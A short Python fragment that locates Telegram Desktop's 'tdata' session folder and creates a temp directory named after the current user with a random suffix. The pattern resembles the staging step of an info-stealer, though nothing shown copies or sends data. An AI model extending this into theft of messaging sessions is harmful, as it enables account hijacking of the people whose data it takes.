import os
import random
import string
import getpass
import tempfile

def test():
    telegram_path = os.path.expanduser(r"~\\AppData\\Roaming\\Telegram Desktop\\tdata")
    if not os.path.exists(telegram_path):
        try:
            os.makedirs(telegram_path)
        except Exception as e:
            pass 
def create_temp_folder():
    computer_name = getpass.getuser()
    random_suffix = '-' + ''.join(random.choices(string.digits, k=3))
    temp_dir = tempfile.gettempdir()
    test()
    folder_name = computer_name + random_suffix
    folder_path = os.path.join(temp_dir, folder_name)
    os.makedirs(folder_path, exist_ok=True)
    return folder_path
